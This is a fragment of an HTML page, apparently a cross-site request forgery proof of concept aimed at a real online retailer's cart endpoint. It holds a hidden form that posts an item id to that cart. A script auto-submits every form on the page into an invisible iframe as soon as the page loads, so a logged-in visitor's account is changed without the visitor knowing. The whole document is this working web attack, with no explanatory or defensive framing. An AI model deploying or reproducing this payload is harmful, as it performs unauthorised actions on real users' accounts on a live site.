    <form action="https://www.therealreal.com/cart/items" method="POST">
      <input type="hidden" name="id" value="49994478" />
    </form>

    <iframe name="hiddenFrame" style="display:none;"></iframe>

    <script>
      let i = 0;
      const forms = document.forms;

      function submitNext() {
        if (i < forms.length) {
          forms[i].target = "hiddenFrame";
          forms[i].submit();
          i++;
          setTimeout(submitNext, 800); // delay مهم
        }
      }

      submitNext();
    </script>

  </body>
